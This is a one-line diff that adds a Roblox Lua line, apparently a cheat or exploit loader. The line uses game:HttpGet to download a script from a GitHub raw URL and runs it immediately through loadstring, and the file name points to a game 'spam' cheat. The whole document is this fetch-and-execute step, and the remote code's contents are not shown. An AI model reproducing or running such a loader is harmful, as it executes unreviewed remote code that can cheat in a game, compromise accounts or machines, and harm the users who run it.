@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/new-mythic-hypershot-spam1-n5k2dq5gifbbcd.lua"))()
